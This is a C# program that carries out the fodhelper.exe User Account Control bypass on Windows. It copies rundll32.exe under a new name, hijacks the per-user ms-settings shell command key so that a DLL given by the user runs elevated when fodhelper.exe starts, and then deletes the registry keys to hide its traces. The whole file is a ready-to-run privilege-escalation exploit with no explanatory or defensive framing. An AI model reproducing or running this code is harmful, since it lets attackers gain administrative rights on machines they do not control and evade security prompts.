using System.Diagnostics;
using Microsoft.Win32;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Please specify the full path to your DLL");
            return;
        }

        string dllPath = args[0];
        string Payload = $"C:\\temp\\luci {dllPath}";
        FodHelper(Payload);
    }

    static void FodHelper(string Payload)
    {
        // Copy C:\windows\system32\rundll32.exe to C:\temp\luci.exe
        File.Copy(@"C:\windows\system32\rundll32.exe", @"C:\temp\luci.exe");

        // Create Registry Structure
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command"))
        {
            key.SetValue("", Payload, RegistryValueKind.String);
            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
        }

        // Start fodhelper.exe
        Process.Start(@"C:\Windows\System32\fodhelper.exe");

        // Cleanup
        System.Threading.Thread.Sleep(3000);
        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
    }
}